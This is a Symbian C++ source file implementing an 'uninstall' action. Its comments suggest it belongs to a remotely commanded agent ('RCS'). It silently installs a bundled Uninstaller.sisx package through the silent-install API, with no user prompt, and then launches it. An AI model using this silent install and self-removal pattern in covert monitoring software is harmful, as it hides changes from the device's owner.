/*
 * ActionUninstall.cpp
 *
 *  Created on: 18/giu/2010
 *      Author: Giovanna
 */

#include <apgcli.h> // for RApaLsSession
#include <apacmdln.h> // for CApaCommandLine

#include <swinstapi.h>			// Uninstaller
#include <swinstdefs.h>

#include "ActionUninstall.h"
#include "Keys.h"


CActionUninstall::CActionUninstall(TQueueType aQueueType) :
	CAbstractAction(EAction_Uninstall, aQueueType)
	{
	// No implementation required
	}

CActionUninstall::~CActionUninstall()
	{
	
	}

CActionUninstall* CActionUninstall::NewLC(const TDesC8& params, TQueueType aQueueType)
	{
	CActionUninstall* self = new (ELeave) CActionUninstall(aQueueType);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionUninstall* CActionUninstall::NewL(const TDesC8& params, TQueueType aQueueType)
	{
	CActionUninstall* self = CActionUninstall::NewLC(params, aQueueType);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionUninstall::ConstructL(const TDesC8& params)
	{
		BaseConstructL(params);
	}

void CActionUninstall::DispatchStartCommandL()
	{
		/**
		 * All the files are generated/downloaded into private app folder and automatically
		 * deleted during uninstall.
		 */
	TInt value = 0;
	if(iConditioned)
		{
		// we are conditioned by a previous sync, we get the result
		RProperty::Get(KPropertyUidCore, KPropertyStopSubactions,value);
		}
	if(value == 0)
		{
		// Install the RCS uninstaller
		InstallAppL();
		
		// Launch Uninstaller
		LaunchAppL();
		}	
	}

void CActionUninstall::LaunchAppL(){
	
	// retrieve uid3 of uninstaller
	TBuf8<12> hexBuf(KUidUninstaller);
	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
	TLex8 lex(hexBuf);
	TUint32 bdUid;
	lex.Val(bdUid,EHex);
	TUid kUid3 = TUid::Uid(bdUid);
	// construct TUidType
	TUidType uidType(TUid::Uid(0x1000007a), TUid::Uid(0x0), kUid3 );
	// create process with that uid, so we are sure it's not another with the same name
	RProcess process;
	process.Create(_L("Uninstaller.exe"),KNullDesC, uidType); 
	process.Resume();
	process.Close();
	}

void CActionUninstall::InstallAppL(){

	// Prepare for silent install
	SwiUI::RSWInstSilentLauncher      launcher; 
	SwiUI::TInstallOptions            options;
	SwiUI::TInstallOptionsPckg        optionsPckg;	
	
	// Connect to the server
	User::LeaveIfError( launcher.Connect() );
	  
	// See SWInstDefs.h for more info about these options
	options.iUpgrade = SwiUI::EPolicyAllowed;
	options.iOCSP = SwiUI::EPolicyNotAllowed;
	options.iDrive = 'C';   // Hard-coded as phone memory  
	options.iUntrusted = SwiUI::EPolicyNotAllowed; 
	options.iCapabilities = SwiUI::EPolicyAllowed;
	    
	optionsPckg = options;
	
	// Create path
	TFileName path;
	TInt err = GetPrivatePath(path);
	path.Append(_L("Uninstaller.sisx"));
	
	// Start synchronous install
	err = KErrNone;
	err = launcher.SilentInstall(path,optionsPckg);
		
	launcher.Close();
}

TInt CActionUninstall::GetPrivatePath(TFileName& privatePath)
{
	TFileName KPath;
	RFs fsSession;
	TInt result;
	result = fsSession.Connect();
	if (result != KErrNone)
		return result;
	fsSession.PrivatePath(KPath);
	TFindFile findFile(fsSession);
	privatePath = KPath;
	result = findFile.FindByDir(KPath, KNullDesC);
	if (result == KErrNone) 
		privatePath = findFile.File();
	fsSession.Close();
	return result;
}
